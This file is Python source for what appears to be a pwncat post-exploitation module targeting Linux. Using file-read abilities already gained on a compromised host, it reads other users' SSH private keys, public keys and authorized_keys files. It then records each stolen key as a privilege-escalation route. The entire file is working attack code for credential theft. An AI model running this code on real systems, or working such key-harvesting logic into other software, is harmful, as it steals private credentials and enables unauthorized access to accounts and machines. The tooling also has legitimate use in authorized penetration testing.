#!/usr/bin/env python3

from pwncat.facts import Implant, PrivateKey, EscalationReplace
from pwncat.modules import Status, ModuleFailed
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class Module(EnumerateModule):
    """Find escalation methods by using file-read abilities to
    leak other user's private keys."""

    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS

    def enumerate(self, session: "pwncat.manager.Session"):
        """ Locate usable file read abilities and generate escalations """

        # Ensure users are already cached
        list(session.iter_users())

        for ability in session.run("enumerate", types=["ability.file.read"]):

            user = session.find_user(uid=ability.uid)
            if user is None:
                continue

            yield Status(f"leaking key for [blue]{user.name}[/blue]")

            ssh_path = session.platform.Path(user.home, ".ssh")
            authkeys = None
            pubkey = None
            # We assume its an authorized key even if we can't read authorized_keys
            # This will be modified if connection ever fails.
            authorized = True

            try:
                with ability.open(session, str(ssh_path / "id_rsa"), "r") as filp:
                    privkey = filp.read()
            except (ModuleFailed, FileNotFoundError, PermissionError) as exc:
                yield Status(
                    f"leaking key for [blue]{user.name}[/blue] [red]failed[/red]"
                )
                continue

            try:
                with ability.open(session, str(ssh_path / "id_rsa.pub"), "r") as filp:
                    pubkey = filp.read()
                if pubkey.strip() == "":
                    pubkey = None
            except (ModuleFailed, FileNotFoundError, PermissionError) as exc:
                yield Status(
                    f"leaking pubkey [red]failed[/red] for [blue]{user.name}[/blue]"
                )

            if pubkey is not None and pubkey != "":
                try:
                    with ability.open(
                        session, str(ssh_path / "authorized_keys"), "r"
                    ) as filp:
                        authkeys = filp.read()
                    if authkeys.strip() == "":
                        authkeys = None
                except (ModuleFailed, FileNotFoundError, PermissionError) as exc:
                    yield Status(
                        f"leaking authorized keys [red]failed[/red] for [blue]{user.name}[/blue]"
                    )

            if pubkey is not None and authkeys is not None:
                # We can identify if this key is authorized
                authorized = pubkey.strip() in authkeys

            yield PrivateKey(
                self.name,
                str(ssh_path / "id_rsa"),
                ability.uid,
                privkey,
                False,
                authorized=authorized,
            )
